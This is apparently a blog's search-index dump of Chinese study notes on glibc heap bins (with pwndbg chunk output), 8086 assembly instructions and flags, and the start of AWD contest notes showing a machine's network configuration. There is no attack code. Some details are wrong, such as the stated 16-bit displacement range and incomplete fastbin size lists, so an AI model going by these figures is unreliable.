bk_nextsize = 0x21&#125;0x555555756290 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 33, fd = 0x555555756280, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x21&#125;0x5555557562b0 FASTBIN &#123; mchunk_prev_size = 0, mchunk_size = 33, fd = 0x5555557562a0, bk = 0x0, fd_nextsize = 0x0, bk_nextsize = 0x20d31&#125; 123pwndbg&gt; binstcachebins0x20 [ 4]: 0x5555557562c0 —▸ 0x5555557562a0 —▸ 0x555555756280 —▸ 0x555555756260 ◂— 0x0 还可以直接查看内存中chunk的情况（64位系统用gx，32位用wx） 12345pwndbg&gt; x/4gx 0x555555756250 (prev_size) (size)0x555555756250: 0x0000000000000000 0x0000000000000021 (User data)0x555555756260: 0x0000000000000000 0x0000000000000000 fastbins主要是用于提高小内存的分配效率，默认情况下： 对于SIZE_SZ为4Bytes的平台，小于64Bytes的chunk分配请求 对于SIZE_SZ为8Bytes的平台，小于128Bytes的chunk分配请求 首先会查找fastbins中是否有所需要大小的chunk存在（精确匹配大小），如果存在，就直接返回 fastbins可以看作是samll bins的一小部分cache，默认情况下，fastbins只cache了small bins的前7个大小的空闲chunk（虽然有10个chunk的空间），也就是说： 对于对于SIZE_SZ为4Bytes的平台，fastbins的7个chunk空闲链表（bin），每个bin的chunk大小依次为：16Bytes，24Bytes，32Bytes，40Bytes，56Bytes，64Bytes 对于对于SIZE_SZ为8Bytes的平台，fastbins的7个chunk空闲链表（bin），每个bin的chunk大小依次为：32Bytes，48Bytes，64Bytes，80Bytes，96Bytes，128Bytes Unsorted bin可以看作是small bins和large bins的cache，只有1个unsort bin，以双向链表管理空闲chunk，空闲chunk不排序，所有的chunk在回收时都要先放到unsorted bin中，分配时，如果在unsorted bin中没有合适的chunk，就会把unsorted bin中的所有的chunk分别加入到所属的bin中，然后再在bin中分配合适的chunk。Bins数组中的元素bin[1]用于存储unsorted bin的chunk链表头 small binssmall bins管理空闲小chunk，每个small bin中的chunk大小与bin的index有如下关系： chunk_size = 2*SIZE_SZ * index 因此在SIZE_SZ为4B的平台上，small_bins中的chunk大小是以8B为公差的等差数列，最大的chunk大小为504B，最小的chunk大小为16B，所在实际上共62个bin 在SIZE_SZ为8B的平台上，small_bins中的chunk大小是以16B为公差的等差数列，最大的chunk大小为1008B，最小的chunk大小为32B，所在实际上共62个bin","categories":[],"tags":[]},{"title":"8086汇编笔记04","slug":"8086╗π▒α▒╩╝╟04","date":"2020-02-07T08:33:23.000Z","updated":"2020-02-08T00:33:38.000Z","comments":true,"path":"2020/02/07/8086╗π▒α▒╩╝╟04/","link":"","permalink":"http://yoursite.com/2020/02/07/8086╗π▒α▒╩╝╟04/","excerpt":"","text":"标志寄存器8086CPU的标志寄存器(flag)有16位，其中存储的信息通常被称为程序状态字(PSW)。flag和其它寄存器不一样，其它寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息 flag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊的含义 0 CF 2 PF 4 AF 6 ZF 7 SF 8 TF 9 IF 10 DF 11 OF 在8086CPU的指令集中，有的指令的执行是影响标志寄存器的，比如：add、sub、mul、div、inc、or、and等，它们大都是运算指令（进行逻辑或算术运算） 有的指令的执行对标志寄存器没有影响，比如：mov、push、pop等，它们大都是传送指令 我们在使用一条指令的时候，要注意这条指令的全部功能，其中包括，执行结果对标志寄存器的哪些标志位造成影响。有时候一条指令会对标志寄存器中的多个标志位产生影响 ZF标志ZF是零标志位，它记录相关指令执行后： 结果为0，ZF=1 结果不为0，ZF=0 例如： 12mov ax,1sub ax,1 指令执行后，结果为0，则ZF=1 12mov ax,2sub ax,1 指令执行后，结果为1，则ZF=0 PF标志PF是奇偶标志位，它记录指令执行后，结果的所有二进制位中1的个数： 为偶数，PF=1 为奇数，PF=0 例如： 12mov al,1add al,10 执行后，结果为00001011B，其中有3（奇数）个1，则PF=0 12mov al,1or al,10 执行后，结果为00000011B，其中有2（偶数）个1，则PF=1 SF标志SF是符号标志位，它记录指令执行后： 结果为负，SF=1 结果为正，SF=0 在我们将数据当作有符号数来运算的时候，可以通过它来得知结果的正负。但是，如果我们将数据当作无符号数来运算，SF的值则没有意义，虽然相关的指令影响了它的值 CPU在执行add等指令时，是必然要影响到SF标志位的值，至于我们需不要这种影响，就取决于我们如何看待指令所进行的运算了 CF标志CF是进位标志位，一般情况下，在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值 对于位数为N的无符号数来说，其对应的二进制信息的最高位，即第N-1位是最高有效位。而假想存在的第N位，就是相对于最高有效位的更高位。其实CPU在运算的时候，并不丢弃进位值，而是记录在CF位 OF标志OF是溢出标志位，记录是否产生了溢出，一定要注意CF和OF的区别： CF是对无符号数运算有意义的标志位，对于无符号数运算，CPU用CF位来记录是否产生了进位 OF是对有符号数运算有意义的标志位，对于有符号数运算，CPU用OF位来记录是否产生了溢出 adc指令adc是带进位加法指令，它利用了CF位上记录的进位值 格式： 1adc 操作对象1，操作对象2 功能： 操作对象1 = 操作对象1 + 操作对象2 + CF 例子： 1adc ax,bx 其实现的功能是：(ax)=(ax)+(bx)+CF 例子： 1234mov ax,2mov bx,1sub bx,axadc ax,1 执行后，(ax)=4，相当于计算：（ax）+1+CF=2+1+1=4 在执行adc指令的时候加上的CF的值的含义，由之前的指令决定的，也就是说关键在于所加上的CF值是被什么指令设置的，如果CF的值是被sub指令设置的，那么它的含义就是借位值；如果是被add指令设置的，那么它的含义就是进位值 sbb指令sbb是带借位减法指令，它利用了CF位上记录的借位值 格式： 1sbb 操作对象1，操作对象2 功能： 操作对象1 = 操作对象1 - 操作对象2 - CF 例子： 1sbb ax,bx 其实现的功能是：(ax)=(ax)-(bx)-CF cmp指令cmp是比较指令，功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响，其他相关指令通过识别这些被影响的标志寄存器来得知比较结果 格式： 1cmp 操作对象1，操作对象2 功能： 操作对象1 - 操作对象2 ，但并不保存结果，仅仅根据计算结果对标志寄存器进行设置 例子： 1cmp ax,ax 做(ax)-(ax)的运算，结果为0，但并不在ax中保存，仅影响flag的相关各位，指令执行后： ZF=1 PF=1 SF=0 CF=0 OF=0 123mov ax,8mov bx,3cmp ax,bx 指令执行后： (ax)=8 ZF=0 PF=1 SF=0 CF=0 OF=0 可以得到以下逻辑 1cmp ax,bx 如果(ax)=(bx)，则(ax)-(bx)=0，所以：ZF=1 如果(ax)!=(bx)，则(ax)-(bx)!=0，所以：ZF=0 如果(ax)&lt;(bx)，则(ax)-(bx)将产生借位，所以：CF=1 如果(ax)&gt;=(bx)，则(ax)-(bx)不必借位，所以：CF=0 如果(ax)&gt;(bx)，则(ax)-(bx)不必借位且结果也不为0，所以：CF=0且ZF=0 如果(ax)&lt;=(bx)，则(ax)-(bx)既可能产生借位且结果又可能为0，所以：CF=1且ZF=1 1cmp ax,ax ZF=1，说明(ax)=(bx) ZF=0，说明(ax)!=(bx) CF=1，说明(ax)&lt;(bx) CF=0，说明(ax)&gt;=(bx) CF=0且ZF=0，说明(ax)&gt;(bx) CF=1或ZF=1，说明(ax)&lt;=(bx) 检测比较结果的条件转移指令 指令 含义 检测的相关标志位 je 等于则转移 ZF=1 jne 不等于则转移 ZF=0 jb 低于则转移 CF=1 jnb 不低于则转移 CF=0 ja 高于则转移 CF=0,ZF=0 jna 不高于则转移 CF=1或ZF=1 这些指令都比较常用，它们所检测的标志位都是cmp指令进行无符号数比较时记录比较结果的标志位： j：表示jump e：表示equal ne：表示not equal b：表示below nb：表示not below a：表示above na：表示note above DF标志和串传送指令DF是方向标志位，在串处理指令中，控制每次操作后si，di的增减 DF=0：每次操作后si，di递增 DF=1：每次操作后si，di递减 格式1： 1movsb 将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器DF位的值，将si和di递增或递减 功能：（以字节为单位传送） ((es)16+(di))=((ds)16+(si)) 如果DF=0，则： (si)=(si)+1 (di)=(di)+1 如果DF=1，则： (si)=(si)-1 (di)=(di)-1 格式1： 1movsw 将ds:si指向的内存单元中的字送入es:di中，然后根据标志寄存器DF位的值，将si和di递增2或递减2 功能：（以字为单位传送） ((es)16+(di))=((ds)16+(si)) 如果DF=0，则： (si)=(si)+2 (di)=(di)+2 如果DF=1，则： (si)=(si)-2 (di)=(di)-2 movsb和movsw进行的是串传送操作中的一个步骤，一般来说，movsb和movsw都和rep配合使用，格式如下： 1rep movsb rep的作用是根据cx的值，重复执行后面的串送指令。由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前个单元，则rep movsb就可以循环实现（cx）个字符的传送 8086CPU提供以下两条指令对DF位进行设置： cld指令：将标志寄存器的DF置0 std指令：将标志寄存器的DF置1 pushf和popf pushf：将标志寄存器的值压栈 popf：从栈中弹出数据，送入标志寄存器中","categories":[],"tags":[]},{"title":"8086汇编笔记03","slug":"8086╗π▒α▒╩╝╟03","date":"2020-02-06T08:09:56.000Z","updated":"2020-02-07T00:10:12.000Z","comments":true,"path":"2020/02/06/8086╗π▒α▒╩╝╟03/","link":"","permalink":"http://yoursite.com/2020/02/06/8086╗π▒α▒╩╝╟03/","excerpt":"","text":"Call和Retcall和ret指令都是转移指令，他们都修改IP，或同时修改CS和IP，他们经常被共同用来实现程序的设计 ret和retf ret指令用栈中的数据修改IP的内容，从而实现近转移 CPU执行ret指令时，进行下面两步操作 (IP)=((ss)*16+(sp)) (sp)=(sp)+2 CPU执行ret指令时，相当于进行： pop IP retf指令用栈中的数据修改CS和IP的内容，从而实现远转移 CPU执行retf指令时，进行下面两步操作 (IP)=((ss)*16+(sp)) (sp)=(sp)+2 (CS)=((ss)*16+(sp)) (sp)=(sp)+2 CPU执行ret指令时，相当于进行： pop IP pop CS 使用ret的例子： 1234567891011121314151617assume cs:codesgstack segment db 16 dup (0)stack endscodesg segment mov ax,4c00h int 21hstart: mov ax,stack mov ss,ax mov sp,16 mov ax,0 push ax mov bx,0 retcodesg endsend start 使用retf的例子： 123456789101112131415161718assume cs:codesgstack segment db 16 dup (0)stack endscodesg segment mov ax,4c00h int 21hstart: mov ax,stack mov ss,ax mov sp,16 mov ax,0 push ax push cs mov bx,0 retfcodesg endsend start call指令call指令经常跟ret指令配合使用，因此CPU执行call指令，进行两步操作： 将当前的IP或CS和IP压入栈中 转移(jump) call指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同 依据位移经行转移的call指令1call 标号 （将当前的IP压栈后，转到标号处执行指令） CPU执行此种格式的call指令时，进行如下的操作： (sp)=(sp)-2 ((ss)*16+(sp))=(IP) (IP)=(IP)+16位位移 相当于进行 12push IPjmp near ptr 标号 一些解释： 16位移 = “标号”处的地址 - call指令后的第一个字节的地址 16位位移的范围为-32769~32767，用补码表示 16位位移由编译程序在编译时算出 转移的目的地址在指令中的call指令1call far ptr 标号 （实现的是段间转移） CPU执行此种格式的指令时，进行如下的操作： (sp)=sp-2 ((ss)*16+(sp))=(CS) (sp)=sp-2 ((ss)*16+(sp))=(IP) (CS)=标号所在的段地址 (IP)=标号所在的段地址 相当于进行 123push CSpush IPjmp far ptr 标号 转移地址在寄存器中的call指令1call 16位寄存器 CPU执行此种格式的指令时，进行如下的操作： (sp)=(sp)-2 ((ss)*16+(sp))=(IP) (IP)=(16位寄存器) 相当于进行 12push IPjmp 16位寄存器 转移地址在内存中的call指令1call word ptr 内存单元地址 相当于进行： 12push IPjmp word ptr 内存单元地址 例子： 1234mov sp,10hmov ax,0123hmov ds:[0],axcall word ptr ds:[0] 执行后，(IP)=0123H，(sp)=0EH 1call dword ptr 内存单元地址 相当于进行： 123push CSpush IPjmp dword ptr 内存单元地址 例子： 12345mov sp,10hmov ax,0123hmov ds:[0],axmov word ptr ds:[2],0call word ptr ds:[0] 执行后，(CS)=0，(IP)=0123H，(sp)=0CH mul指令mul是乘法指令 相乘的两个数，要么都是8位，要么都是16位 8位：AL中和8位寄存器或内存字节单元中 16位：AX中和16位寄存器或内存字节单元中 运算结果 8位：AX中 16位：DX（高位）和AX（地位）中 格式如下： 12mul regmul 内存单元 内存单元可以用不同的寻址方式给出： 1mul byte ptr ds:[0] 含义为：(ax)=(al)*((ds)*16+0) 1mul word ptr [bx+si+8] 含义为： (ax)=(al)*((ds)*16+(bx)+(si)+8)结果的低16位 (dx)=(al)*((ds)*16+(bx)+(si)+8)结果的高16位 参数和结果传递的问题子程序一般都要根据提供的参数处理一定的事务，处理后，将结果（返回值）提供给调用者 用寄存器来存储参数和结果是最常使用的方法。对于存放参数的寄存器和存放结果的寄存器，调用者和子程序的读写操作恰恰相反： 调用者将参数送入参数寄存器，从结果寄存器中取到返回值 子程序从参数寄存器中取到参数，将返回值送入结果寄存器 除了寄存器、内存传递参数外，还有一种通用的方法使用栈来传递参数","categories":[],"tags":[]},{"title":"8086汇编笔记02","slug":"8086╗π▒α▒╩╝╟02","date":"2020-02-05T06:13:51.000Z","updated":"2020-02-05T22:14:10.000Z","comments":true,"path":"2020/02/04/8086╗π▒α▒╩╝╟02/","link":"","permalink":"http://yoursite.com/2020/02/04/8086╗π▒α▒╩╝╟02/","excerpt":"","text":"汇编指令与机器码的对应示例 汇编指令 机器指令 mov ax,0123 B8 23 01 mov ax,ds:[0123] A1 23 01 push ds:[0123] FF 36 23 01 可以看到，在一般的汇编指令中，汇编指令中的idata(立即数)，不论它是表示一个数据还是内存单元的偏移地址，都会在对应的机器指令中出现 转移指令8086CPU的转移指令分为以下几类 无条件转移指令（如：jump） 条件转移指令 循环指令（如：loop） 过程（函数） 中断 操作符offset操作符offset的功能是取得标号的偏移地址(相对于当前段地址) 例子： 123456assume cs:codesgcodesg segmentstart: mov ax,offset start;相当于mov ax,0 (cs:offset start) s: mov ax,offset s ;相当于mov ax,3 (cs:offset s)codesg endsend start jmp指令jmp为无条件转移，可以只修改IP，也可以同时修改CS和IP，同时jmp指令需要给出两种信息： 转移的目的地址 转移的距离（段间转移、段内短转移、段内近转移） 依据位移进行转移的jmp指令1jmp short 标号（转移到标号处执行指令） 这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127，也就是说它向前转移时可以最多越过128个字节，向后转移可以最多越过127个字节 例子： 12345678assume cs:codesgcodesg segmentstart: mov ax,0 jmp short s add ax,1 s: inc axcodesg endsend start 实际上指令jmp short 标号的功能为(IP)=(IP)+8位位移 8位位移 = “标号”处的地址 - jmp指令后的第一个字节的地址 short指明此处的位移为8位位移 8位位移的范围为-128~127，用补码表示 8位位移由编译程序在编译时算出 1jmp near ptr 标号 这个指令实现的是段内近转移，即(IP)=(IP)+16位位移 16位移 = “标号”处的地址 - jmp指令后的第一个字节的地址 near ptr指明此处的位移为16位位移 16位位移的范围为-32769~32767，用补码表示 16位位移由编译程序在编译时算出 转移的目的地址在指令中的jmp指令1jmp far ptr 标号 实现的是段间转移，又称为远转移 （CS）= 标号所在段的段地址 （IP） = 标号所在段中的偏移地址 far ptr 指明了指令用标号的段地址和偏移地址修改了CS和IP 例子： 12345678910assume cs:codesgcodesg segmentstart: mov ax,0 mov bx,0 jmp far ptr s db 256 dup(0) s: add ax,1 inc axcodesg endsend start 转移地址在寄存器中的jmp指令1jmp 16位寄存器 功能：（IP）= （16位寄存器） 转移地址在内存中的jmp指令1jmp word ptr 内存单元地址（段内转移） 功能：从内存单元地址处开始存放着一个字型数据，是转移的目的偏移地址，内存单元地址可用寻址方式的任一格式给出 例子： 123mov ax,0123Hmov ds:[0],axjmp word ptr ds:[0] 1jmp dword ptr 内存单元地址（段内转移） 功能：从内存单元地址处开始存放着两个字型数据，高地址处的字是转移的目的段地址，低地址是转移的目的偏移地址，内存单元地址可用寻址方式的任一格式给出 （CS）=（内存单元地址+2） （IP）=（内存单元地址） 例子： 1234mov ax,0123Hmov ds:[0],axmov word ptr ds:[2],0jmp dword ptr ds:[0] 1234mov ax,0123Hmov ds:[0],axmov word ptr [bx+2],0jmp dword ptr [bx] jcxz指令jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127，一般的有条件转移指令看的都是cx寄存器，例如loop指令 1jcxz 标号 （如果（cx）=0，则转移到标号初执行） jcxz实际的指令操作： 当（cx）= 0时，（IP）=（IP）+ 8位位移 8位位移 = “标号”处的地址 - jcxz指令后的第一个字节的地址 8位位移的范围为-128~127，用补码表示 8位位移由编译程序在编译时算出 当（cx）=0时，什么也不做（程序向下执行） 其实也可以理解为 12if((cx)==0) jmp short 标号 loop指令loop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127 1loop 标号 loop实际的指令操作： （cx）=（cx）- 1 当（cx）！= 0时，（IP）=（IP）+ 8位位移 8位位移 = “标号”处的地址 - loop指令后的第一个字节的地址 8位位移的范围为-128~127，用补码表示 8位位移由编译程序在编译时算出 当（cx）=0时，什么也不做（程序向下执行） 其实也可以理解为 123(cx)--;if((cx)!=0) jmp short 标号","categories":[],"tags":[]},{"title":"8086汇编笔记01","slug":"8086╗π▒α▒╩╝╟01","date":"2020-02-04T08:13:32.000Z","updated":"2020-02-05T00:13:50.000Z","comments":true,"path":"2020/02/04/8086╗π▒α▒╩╝╟01/","link":"","permalink":"http://yoursite.com/2020/02/04/8086╗π▒α▒╩╝╟01/","excerpt":"","text":"reg/sregreg:寄存器reg的集合包括:ax,bx,cx,dx,ah,al,bh,bl,ch,cl,dh,dl,sp,bp,si,di sreg：段寄存器sreg的集合包括:ds,ss,cs,es bx,si,di,bp 在8086CPU中，只有这4个寄存器（bx,bp,si,di）可以用在[…]中来进行内存单元的寻址 正确的指令形式:mov ax,[bx] mov ax,[bx+si] 错误的指令形式:mov ax,[cx] mov ax,[ax] 在[…]中这4个寄存器可以单个出现，或只能以四种组合出现：bx和si、bx和di、bp和si、bp和di 错误的用法：mov ax,[bx+bp] mov ax,[si+di] 只要在[…]中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在ss中 数据的位置汇编语言用三个概念来表示数据的位置 立即数（idata） 对于直接包含在机器指令中的数据（执行前在CPU的指令缓冲器中），例如mov ax.1中的1即为立即数 寄存器 段地址（SA）和偏移地址（EA） 存放段地址的寄存器可以是默认的 默认在ds中的场景 mov ax,[0] mov ax,[bx] mov ax,[bx+8] mov ax,[bx+si] mov ax,[bx+si+8] 默认在ss中的场景 mov ax,[bp] mov ax,[bp+8] mov ax,[bp+si] mov ax,[bp+si+8] 存放段地址的寄存器也可以显性的给出 mov ax,ds:[bp] mov ax,es:[bx] mov ax,ss:[bx+si] mov ax,cs:[bx+si+8] 数据的长度8086CPU的指令可以处理两种尺寸的数据，字节（byte）和字（word），所以在机器指令中要指明，指令进行的是字操作还是字节操作，在32位处理器中还引入了双字（double word），在64位处理器还引入了四字 通过寄存器名指明要处理的数据的尺寸 指明了是字（word）操作 mov ax,1 mov bx,ds:[0] mov ds,ax mov ds:[0],ax inc ax add ax,1000 指明了是字节（byte）操作 mov al,1 mov al,bl mov al,ds:[0] mov ds:[0],al inc al add al,100 在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在8086汇编指令中可以为word或byte 用word ptr指明访问字（word）单元 mov word ptr ds:[0],1 inc word ptr [bx] inc word ptr ds:[0] add word ptr [bx],2 用byte ptr指明访问字节（byte）单元 其他方法 有些指令默认了访问的是字节（byte）或字（word） push指令只进行字（word）操作：push [1000H] 结构化访问数据一般来说我们可以用[bx+idata+si]的方式来进行访问结构体中的数据 用bx定位整个结构体 用idata定位结构体中的某一个数据项 用si定位数组项中的每个元素 所以也可以使用更方便的写法，例如：[bx].idata [bx].idata[si] divdiv是除法指令（division），使用div作除法的时候 除数：8位或16位，在寄存器或内存单元中 被除数：（默认）放在AX或DX和AX中 除数 被除数 8位 16位（AX） 16位 32位（DX+AX） 运算 8位 16位 商 AL AX 余数 AH DX div指令格式： div reg div 内存单元 div byte ptr ds:[0] div word ptr es:[0] db、dw、dddbdb在汇编中表示一个byte，就是一个字节8位，每次读取数据时，读完一个偏移量加1 dwdw在汇编中表示一个字（word），就是两个字节16位，每次读取数据时，读完一个偏移量加2 dd dd在汇编中表示一个双字，就是四个字节32位，每次读取数据时，读完一个偏移量加4 dupdup和db、dw、dd等数据定义伪指令配合使用的，来进行数据的重复 db 重复的次数 dup (重复的字节型数据) dw 重复的次数 dup (重复的字型数据) dd 重复的次数 dup (重复的双字型数据) 示例 db 3 dup(0) 定义了3个字节，他们的值都是0，相当于db 0,0,0 db 3 dup(0,1,2) 定义了9个字节，他们的值是(0,1,2,0,1,2,0,1,2)，相当于db 0,1,2,0,1,2,0,1,2 db 3 dup(‘abc’,’ABC’) 定义了18个字节，他们的值是(‘abcABCabcABCabcABC’)，相当于db ‘abcABCabcABCabcABC’","categories":[],"tags":[]},{"title":"8086内存寻址方式小结","slug":"8086─┌┤µ╤░╓╖╖╜╩╜╨í╜ß","date":"2020-02-03T06:42:36.000Z","updated":"2020-02-05T00:13:06.000Z","comments":true,"path":"2020/02/02/8086─┌┤µ╤░╓╖╖╜╩╜╨í╜ß/","link":"","permalink":"http://yoursite.com/2020/02/02/8086─┌┤µ╤░╓╖╖╜╩╜╨í╜ß/","excerpt":"","text":"8086内存寻址的段地址寄存器默认为ds，主要有以下几种方式 [idata]用一个常量来表示地址，可用于直接定位一个内存单元，例如mov ax,[2]，结果就是(ax)=(ds)*16+idata [bx]用一个变量来表示内存地址，可用于间接定位一个内存单元，例如mov ax,[bx]，结果就是(ax)=(ds)*16+bx [bx+idata]用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元，例如mov ax,[bx+8]或者mov ax,8[bx]，结果就是（ax)=(ds)*16+(bx)+idata [bx+si]用两个变量表示地址，例如mov ax,[bx+si+8]或者mov ax,8[bx+si]，结果就是（ax)=(ds)*16+(bx)+(si)+idata","categories":[],"tags":[]},{"title":"AWD线下赛笔记","slug":"AWD╧▀╧┬╚ⁿ▒╩╝╟","date":"2019-12-31T02:45:08.000Z","updated":"2019-12-31T18:45:24.000Z","comments":true,"path":"2019/12/30/AWD╧▀╧┬╚ⁿ▒╩╝╟/","link":"","permalink":"http://yoursite.com/2019/12/30/AWD╧▀╧┬╚ⁿ▒╩╝╟/","excerpt":"","text":"配置路由表首先调用ipconfig查看本机网络状况 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758PS C:\\Users\\syc&gt; ipconfigWindows IP 配置以太网适配器 vEthernet (Default Switch): 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::861:2a51:6e5a:761b%9 IPv4 地址 . . . . . . . . . . . . : 172.17.126.97 子网掩码 . . . . . . . . . . . . : 255.255.255.240 默认网关. . . . . . . . . . . . . :以太网适配器 以太网: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::716b:1e8e:e67a:bdf%20 IPv4 地址 . . . . . . . . . . . . : 10.0.10.2 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . :以太网适配器 以太网 2: 媒体状态 . . . . . . . . . . . . : 媒体已断开连接 连接特定的 DNS 后缀 . . . . . . . :以太网适配器 VirtualBox Host-Only Network: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::40de:409b:e37f:34eb%4 IPv4 地址 . . . . . . . . . . . . : 192.168.56.1 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . :以太网适配器 VirtualBox Host-Only Network #2: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::cd1f:a63d:6cee:c094%17 IPv4 地址 . . . . . . . . . . . . : 192.168.201.2 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . :无线局域网适配器 本地连接* 1: 媒体状态 . . . . . . . . . . . . : 媒体已断开连接 连接特定的 DNS 后缀 . . . . . . . :无线局域网适配器 本地连接* 3: 媒体状态 . . . . . . . . . . . . : 媒体已断开连接 连接特定的 DNS 后缀 . . . . . . . :以太网适配器 VMware Network Adapter VMnet1: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::9401:d238:7f61:d7d3%7 IPv4 地址 . . . . . . . . . . . . : 192.168.61.1 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . :以太网适配器 VMware Network Adapter VMnet8: 连接特定的 DNS 后缀 . . . . . . . : 本地链接 IPv6 地址. . . . . . . . : fe80::907b:8932:6a09:c20b%10 IPv4 地址 . . . . . . . . . . . . : 192.168.159.1 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . :无线局域网适配器 WLAN: 连接特定的 DNS 后缀 . . . . . . . : IPv6 地址 . . . . . . . . . . . . : 2409:8955:3014:2e39:4438:1682:19e2:8070 临时 IPv6 地址. . . . . . . . . . : 2409:8955:3014:2e39:6513:5ca8:8df0:e7f 本地链接 IPv6 地址. . . . . . . . : fe80::4438:1682:19e2:8070%16 IPv4 地址 . . . . . . . . . . . . : 192.168.43.65 子网掩码 . . . . . . . . . . . . : 255.255.255.0 默认网关. . . . . . . . . . . . . : fe80::90f0:52ff:fe0e:4b86%16以太网适配器 蓝牙网络连接: 媒体状态 . . . . . . . . . . . . : 媒体已断开连接 连接特定的 DNS 后缀 . . . . . . . : 然后调用route print查看本机路由表情况 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118PS C:\\Users\\syc&gt; route print===========================================================================接口列表 9...00 15 5d bf b4 b8 ......Hyper-V Virtual Ethernet Adapter 20...80 e8 2c 1a 31 4d ......Realtek PCIe GbE Family Controller 21...08 00 58 00 00 05 ......SSL VPN Client Virtual Network Adapter 4...0a 00 27 00 00 04 ......VirtualBox Host-Only Ethernet Adapter 17...0a 00 27 00 00 11 ......VirtualBox Host-Only Ethernet Adapter #2 25...f2 68 e6 73 9b 9f ......Microsoft Wi-Fi Direct Virtual Adapter 15...b2 68 e6 73 9b 9f ......Microsoft Wi-Fi Direct Virtual Adapter #3 7...00 50 56 c0 00 01 ......VMware Virtual Ethernet Adapter for VMnet1 10...00 50 56 c0 00 08 ......VMware Virtual Ethernet Adapter for VMnet8 16...b0 68 e6 73 9b 9f ......Realtek RTL8822BE 802.11ac PCIe Adapter 11...b0 68 e6 73 9b a0 ......Bluetooth Device (Personal Area Network) 1...........................Software Loopback Interface 1 19...00 00 00 00 00 00 00 e0 Microsoft Teredo Tunneling Adapter===========================================================================IPv4 路由表===========================================================================活动路由:网络目标 网络掩码 网关 接口 跃点数 0.0.0.0 0.0.0.0 192.168.43.1 192.168.43.65 35 0.0.0.0 0.0.0.0 10.0.10.254 10.0.10.2 25 10.0.10.0 255.255.255.0 在链路上 10.0.10.2 281 10.0.10.2 255.255.255.255 在链路上 10.0.10.2 281 10.0.10.255 255.255.255.255 在链路上 10.0.10.2 281 127.0.0.0 255.0.0.0 在链路上 127.0.0.1 331 127.0.0.1 255.255.255.255 在链路上 127.0.0.1 331 127.255.255.255 255.255.255.255 在链路上 127.0.0.1 331 172.17.126.96 255.255.255.240 在链路上 172.17.126.97 271 172.17.126.97 255.255.255.255 在链路上 172.17.126.97 271 172.17.126.111 255.255.255.255 在链路上 172.17.126.97 271 192.168.43.0 255.255.255.0 在链路上 192.168.43.65 291 192.168.43.65 255.255.255.255 在链路上 192.168.43.65 291 192.168.43.255 255.255.255.255 在链路上 192.168.43.65 291 192.168.56.0 255.255.255.0 在链路上 192.168.56.1 281 192.168.56.1 255.255.255.255 在链路上 192.168.56.1 281 192.168.56.255 255.255.255.255 在链路上 192.168.56.1 281 192.168.61.0 255.255.255.0 在链路上 192.168.61.1 291 192.168.61.1 255.255.255.255 在链路上 192.168.61.1 291 192.168.61.255 255.255.255.255 在链路上 192.168.61.1 291 192.168.159.0 255.255.255.0 在链路上 192.168.159.1 291 192.168.159.1 255.255.255.255 在链路上 192.168.159.1 291 192.168.159.255 255.255.255.255 在链路上 192.168.159.1 291 192.168.201.0 255.255.255.0 在链路上 192.168.201.2 281 192.168.201.2 255.255.255.255 在链路上 192.168.201.2 281 192.168.201.255 255.255.255.255 在链路上 192.168.201.2 281 224.0.0.0 240.0.0.0 在链路上 127.0.0.1 331 224.0.0.0 240.0.0.0 在链路上 192.168.56.1 281 224.0.0.0 240.0.0.0 在链路上 192.168.201.2 281 224.0.0.0 240.0.0.0 在链路上 172.17.126.97 271 224.0.0.0 240.0.0.0 在链路上 10.0.10.2 281 224.0.0.0 240.0.0.0 在链路上 192.168.43.65 291 224.0.0.0 240.0.0.0 在链路上 192.168.61.1 291 224.0.0.0 240.0.0.0 在链路上 192.168.159.1 291 255.255.255.255 255.255.255.255 在链路上 127.0.0.1 331 255.255.255.255 255.255.255.255 在链路上 192.168.56.1 281 255.255.255.255 255.255.255.255 在链路上 192.168.201.2 281 255.255.255.255 255.255.255.255 在链路上 172.17.126.97 271 255.255.255.255 255.255.255.255 在链路上 10.0.10.2 281 255.255.255.255 255.255.255.255 在链路上 192.168.43.65 291 255.255.255.255 255.255.255.255 在链路上 192.168.61.1 291 255.255.255.255 255.255.255.255 在链路上 192.168.159.1 291===========================================================================永久路由: 无IPv6 路由表===========================================================================活动路由: 接口跃点数网络目标 网关 16 51 ::/0 fe80::90f0:52ff:fe0e:4b86 1 331 ::1/128 在链路上 19 331 2001::/32 在链路上 19 331 